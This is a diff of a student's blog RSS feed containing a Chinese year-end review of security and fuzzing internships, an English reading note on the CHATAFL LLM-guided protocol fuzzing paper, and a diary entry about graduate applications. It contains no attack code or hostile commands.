+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h4>&lt;h5 id="eagle-cloud-internship" >Eagle Cloud Internship
+&lt;span>
+&lt;a href="#eagle-cloud-internship">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h5>&lt;p>今年过年面试了亿格云公司，感谢Y4👴的推荐，直接把我推到了叶总面前。面我的是刘师傅（诸多src前几名，传闻俩月挖洞挖了辆宝马）这次面试回想起来，我只想用灾难二字形容。&lt;/p>
+&lt;ul>
+&lt;li>简单说几个NLP相关算法，（🤔️&lt;/li>
+&lt;li>简单说一次你的渗透经历，（🤔️&lt;/li>
+&lt;li>等等等等，我只会&amp;ndash;🤔️
 可能是我是短期实习，感谢贵司还是给了我实习的机会。
-在这里呆了俩月，学到了很多业务上的能力，也明白了一些事情：&lt;/li&gt;
-&lt;li&gt;功能上线前不可能总让你完全准备好，先做起来。&lt;/li&gt;
-&lt;li&gt;很多业务是你根本没接触过的，这时候就需要你快速学习的能力。
-实习了两个月，我感觉自己还是更向往学术界一些，工业界可能对我这种不安分的人来说有点boring，加上学校一堆课，就回到了学校。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id=&#34;iscas-intership&#34; &gt;ISCAS Intership
-&lt;span&gt;
-    &lt;a href=&#34;#iscas-intership&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h5&gt;&lt;p&gt;回到学校，就立刻进入到了找暑期实习的状态。三月到五月面了一堆公司，这里挂一下当时的emo推。
-&lt;img src=&#34;https://BestRun.github.io/pictures/20231231162233.png&#34; width=&#34;600&#34; height=&#34;800&#34;&gt;&lt;/p&gt;
-&lt;p&gt;五月份投了ISCAS的系统安全实习生，没想到顺利的通过了之后就开启了直到今天的“科研”实习。&lt;/p&gt;
-&lt;p&gt;可以说，这段实习让我对安全，科研都有了新的认知。&lt;/p&gt;
-&lt;p&gt;七月份到十月份，疯狂的读了很多fuzz相关的论文，感觉打开了新世界（以前甚至肤浅的觉得sec的科研有点花拳绣腿的感觉，不是很实用）。现在发现，学术界才是引领sec发展的最前线。&lt;/p&gt;
-&lt;p&gt;感谢导让我自己负责一个项目，一直坐到今天，也快有了结果。&lt;/p&gt;
-&lt;h4 id=&#34;技术&#34; &gt;技术
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%8a%80%e6%9c%af&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;p&gt;今年技术感觉没啥大的进步，但由于GPT的出现，加上学校里的成，我更深入地去了解了一些NLP的相关知识，也去实践了一些AI和安全相关的东西。最大的进步还是入坑了FUZZ领域吧，还是要继续加油啊，小Hao！&lt;/p&gt;
-&lt;p&gt;此外还被西北大学的xing教授拉去帮忙AIXCC比赛，希望以后有机会去USA读个PHD。&lt;/p&gt;
-&lt;h3 id=&#34;生活情感&#34; &gt;生活（情感）
-&lt;span&gt;
-    &lt;a href=&#34;#%e7%94%9f%e6%b4%bb%e6%83%85%e6%84%9f&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年的生活可以说是有滋有味了，从小Hao的qq空间可以看出来。&lt;/p&gt;
-&lt;p&gt;此外，今年最大的突破可以说是开始了健身。自己的身体摆了两年，今年终于开始要健身了，目前已经健身了一个月，自我感觉良好，从刚开始10kg的哑铃都做不动到现在可以挑战17.5kg，进步还是肉眼可见的哈。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;情感方面，本人目前单身，欢迎来打扰o.o&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;展望规划&#34; &gt;展望&amp;amp;规划
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%b1%95%e6%9c%9b%e8%a7%84%e5%88%92&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;关于留学：申请ing，没啥好说的&lt;/p&gt;
-&lt;p&gt;我是想读个master当gap year然后考虑下去学术界还是工业界。如果没有合适的奥佛，我就打算做一年科研助理直接去学术界了，毕竟master对读博也没啥大用。&lt;/p&gt;
-&lt;p&gt;前两天和梁兄（一位在USA追梦的PHD）交流了一下，我跟他说，我萌生了Gap Year的想法，他也是很支持。他也赞同，花点时间搞清楚自己想要什么更加重要。&lt;/p&gt;
-&lt;p&gt;之前和西北大学的某位前辈请教，问他关于读博的问题，他告所我说sec的PHD还是更看技术一些吧，gpa不要太低就好，说我可以直接申。但是今年是来不及辣，看明年咯，希望一些顺利！&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>Paper Reading Note - CHATAFL</title>
-      <link>https://BestRun.github.io/posts/paper-reading-note-chatafl/</link>
-      <pubDate>Sat, 21 Oct 2023 15:03:05 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/posts/paper-reading-note-chatafl/</guid>
-      <description>&lt;p&gt;Actually, this work is very similar to my research direction in my internship project. I also think some ideas to use LLM to fuzz, but because my work ability and timeline, I haven&amp;rsquo;t finish my project yet. So, today I will summarize  the good idea contributed from this paper.&lt;/p&gt;
-&lt;h2 id=&#34;before-reading&#34; &gt;Before Reading
-&lt;span&gt;
-    &lt;a href=&#34;#before-reading&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;Before diving into it, I have a few questions:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Where and how can LLM be applied to fuzzing?
-&lt;ul&gt;
-&lt;li&gt;In state transitions?&lt;/li&gt;
-&lt;li&gt;In testcase generation?&lt;/li&gt;
-&lt;li&gt;In mutation?&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Regarding LLM:
-&lt;ul&gt;
-&lt;li&gt;Which LLM was used by the author?&lt;/li&gt;
-&lt;li&gt;Did the author fine-tune it?&lt;/li&gt;
-&lt;li&gt;If so, how was it fine-tuned?&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Which protocol did the author research?&lt;/li&gt;
-&lt;li&gt;What are the cost and efficiency considerations?&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;With these questions in mind, I will begin my reading.&lt;/p&gt;
-&lt;h2 id=&#34;start-reading&#34; &gt;Start Reading
-&lt;span&gt;
-    &lt;a href=&#34;#start-reading&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;h3 id=&#34;abstract&#34; &gt;Abstract
-&lt;span&gt;
-    &lt;a href=&#34;#abstract&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;blockquote&gt;
-&lt;p&gt;Our protocol fuzzer CHATAFL constructs grammars for each message type in a protocol, and then mutates messages or predicts the next messages in a message sequence via interactions with LLMs. |&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;And the CHATAFL improve the coverage compare with NSFUZZ.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;CHATAFL covers 47.60% and 42.69% more state transitions, 29.55% and 25.75% more states, and 5.81% and 6.74% more code, respectively.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;introduction&#34; &gt;INTRODUCTION
-&lt;span&gt;
-    &lt;a href=&#34;#introduction&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;The concept of &amp;ldquo;LLM-guided protocol fuzzing&amp;rdquo;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;the fuzzer uses the LLM to extract a machine-readable grammar for a protocol that is used for structure-aware mutation&lt;/li&gt;
-&lt;li&gt;the fuzzer uses the LLM to increase the diversity of messages in the recorded message sequences that are used as initial seeds.&lt;/li&gt;
-&lt;li&gt;the fuzzer uses the LLM to break out of a coverage plateau, where the LLM is prompted to generate messages to reach new states.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Than the author compare the efficiency of chatafl with &lt;a href=&#34;https://github.com/profuzzbench/profuzzbench&#34;&gt;protocol fuzzer benchmark&lt;/a&gt;.&lt;/p&gt;
-&lt;h3 id=&#34;background-and-motivation&#34; &gt;BACKGROUND AND MOTIVATION
-&lt;span&gt;
-    &lt;a href=&#34;#background-and-motivation&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;Here, the author suggest some challenges&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;ol&gt;
-&lt;li&gt;(C1) Dependence on initial seeds. The effectiveness of mutation-based protocol fuzzers is severely limited by the provided initial seed inputs. The pre-recorded message sequences will hardly cover the great diversity of protocol states and input structures as discussed in the protocol specification.&lt;/li&gt;
-&lt;li&gt;(C2) Unknown message structure. Without machinereadable information about the message structure, the fuzzer cannot make structurally interesting changes to the seed messages, e.g., to construct messages of unseen types or to remove, substitute, or add an entire, coherent data structure to a seed message.&lt;/li&gt;
-&lt;li&gt;(C3) Unknown state space. Without machinereadable information about the state space, the fuzzer cannot identify the current state or be directed to explore previously unseen states.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Actually, what&amp;rsquo;s most appealing here is the solution for the &amp;ldquo;state,&amp;rdquo; the rest is just so so. Regarding the &amp;ldquo;state,&amp;rdquo; I need to find out which specific state the author is referring to later.&lt;/p&gt;
-&lt;p&gt;There are three state in Fuzzing&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://BestRun.github.io/pictures/20231021161745.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Next, let&amp;rsquo;s see the Motivation, here the author introduce their solutions for the three challenges mentioned above.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Addressing seed dependence by having the LLM &lt;strong&gt;add a random message&lt;/strong&gt; to a seed message sequence, with a focus on improving message diversity and validity (C1).&lt;/li&gt;
-&lt;li&gt;Dealing with unknown message structures by &lt;strong&gt;requesting the LLM to provide machine-readable information&lt;/strong&gt; about message grammar for various message types, with a focus on assessing the quality and coverage of these grammars compared to the ground truth (C2).&lt;/li&gt;
-&lt;li&gt;Navigating the unknown state space by &lt;strong&gt;requesting the LLM to generate a message that leads to a new state&lt;/strong&gt;, with an investigation into the effectiveness of this approach (C3).&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;How to tell LLM to generate, wondering to know!&lt;/p&gt;
-&lt;h3 id=&#34;case-study-testing-the-capabilities-of-llms-for-protocol-fuzzing&#34; &gt;CASE STUDY: TESTING THE CAPABILITIES OF LLMS FOR PROTOCOL FUZZING
-&lt;span&gt;
-    &lt;a href=&#34;#case-study-testing-the-capabilities-of-llms-for-protocol-fuzzing&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;Skip to the third part: Inducing Interesting State Transitions&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;We provide the LLM the message exchange between fuzzer and the protocol implementation and ask it to return a message that would lead to a new state. We evaluate how likely the message induce a transition to a new state. Specifically, we provide the LLM with existing communication history, enabling a server respectively to reach each state (i.e., INIT, READY, PLAY, and RECORD). Afterward, we query the LLM to determine the next client requests that can affect the server’s state. To mitigate the influence of the LLM’s stochastic behavior, we prompted the LLM 100 times for each state.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Actually, I had proposed the same idea before, but I hadn&amp;rsquo;t put it into practice because we selected a more complex target. Perhaps this event is educational for me. I should do some practices from the simplest target.&lt;/p&gt;
-&lt;p&gt;Perhaps considering how to minimize the LLM cost in algorithm design could also be a promising research direction?&lt;/p&gt;
-&lt;h3 id=&#34;llm-guided-protocol-fuzzing&#34; &gt;LLM-GUIDED PROTOCOL FUZZING
-&lt;span&gt;
-    &lt;a href=&#34;#llm-guided-protocol-fuzzing&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;h4 id=&#34;a-grammar-guided-mutation&#34; &gt;A. Grammar-guided Mutation
-&lt;span&gt;
-    &lt;a href=&#34;#a-grammar-guided-mutation&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;h5 id=&#34;1-grammar-extraction&#34; &gt;1) Grammar Extraction
-&lt;span&gt;
-    &lt;a href=&#34;#1-grammar-extraction&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h5&gt;&lt;p&gt;Here, the author use a method to generate message grammar called &amp;ndash; in-context few-shot learning. Cool, this is a super idea!&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;In-context learning serves as an effective approach to fine-tuning the model. Few-shot learning is utilized to enhance the context with a few examples of desired inputs and outputs. This enables the LLM to recognize the input prompt syntax and output patterns.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h5 id=&#34;2-mutation-based-on-grammar&#34; &gt;2) Mutation based on Grammar
-&lt;span&gt;
-    &lt;a href=&#34;#2-mutation-based-on-grammar&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h5&gt;&lt;p&gt;skip!&lt;/p&gt;
-&lt;h4 id=&#34;b-enriching-initial-seeds&#34; &gt;B. Enriching Initial Seeds
-&lt;span&gt;
-    &lt;a href=&#34;#b-enriching-initial-seeds&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;p&gt;skip!&lt;/p&gt;
-&lt;h4 id=&#34;c-surpassing-coverage-plateau&#34; &gt;C. Surpassing Coverage Plateau
-&lt;span&gt;
-    &lt;a href=&#34;#c-surpassing-coverage-plateau&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;p&gt;A complex design, let&amp;rsquo;s skip it! For have my own ideas, but they&amp;rsquo;re not suitable to share.&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/20231021170616.png&#34; width=&#34;600&#34; height=&#34;1200&#34;&gt;</description>
-    </item>
-    
-    <item>
-      <title>A diary in a special time</title>
-      <link>https://BestRun.github.io/life/a-simple-diary/</link>
-      <pubDate>Sat, 21 Oct 2023 11:15:13 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/life/a-simple-diary/</guid>
-      <description>&lt;h2 id=&#34;my-life-and-mental-state&#34; &gt;My life and mental state
-&lt;span&gt;
-    &lt;a href=&#34;#my-life-and-mental-state&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;Today is Saturday, and I don&amp;rsquo;t want to overwhelm myself with work, even though I&amp;rsquo;m facing the most intense pressure I&amp;rsquo;ve ever experienced in my undergraduate years as I strive to secure a Master&amp;rsquo;s or PhD position.&lt;/p&gt;
-&lt;p&gt;Just yesterday, I gave a presentation for one of my courses. The teacher, an associate professor from Canada, transformed the presentation into a meaningful conversation. He offered a piece of advice that has left a lasting impact on me and provided valuable lessons. He emphasized the importance of always being prepared for a presentation and understanding the purpose at any given time. This advice is especially crucial when you&amp;rsquo;re planning to study abroad, as it&amp;rsquo;s easy to feel lost in a new environment. He humorously added, &amp;ldquo;In many years, you might forget my name and the name of the course, but you&amp;rsquo;ll remember being in a strange place, with an strange course and teacher, telling you to always be prepared and know your purpose.&amp;rdquo;&lt;/p&gt;
-&lt;p&gt;His words deeply resonated with me. Lately, I&amp;rsquo;ve been juggling various commitments, such as internships, preparing for the IELTS, and applying for Master&amp;rsquo;s programs. It&amp;rsquo;s been three months since I last wrote a blog or reflected on my life and studies.So today, I took a moment to sit down in my lab and write this blog to summarize the past few months of my work and life.&lt;/p&gt;
-&lt;p&gt;I&amp;rsquo;d like to share what I&amp;rsquo;ve been up to recently. Firstly, I&amp;rsquo;m still engrossed in my internship project focused on fuzzing at ISCAS. What&amp;rsquo;s more, I&amp;rsquo;m about to commence work with Professor Xing on the AIxCC competition, and I&amp;rsquo;m faced with three course projects that I must complete – it feels like quite a workload!&lt;/p&gt;
-&lt;p&gt;Additionally, this week I&amp;rsquo;ve prepared all the application materials for my UK university applications. I&amp;rsquo;m set to apply to the University of Southampton next Monday.&lt;/p&gt;
-&lt;p&gt;Furthermore, I&amp;rsquo;m in the process of deciding the direction for my bachelor&amp;rsquo;s thesis. I can use the progress I made in AIxCC competition as my bachelor&amp;rsquo;s thesis, but my school tutor also give my a direction about detecting encrypted malicious traffic.&lt;/p&gt;
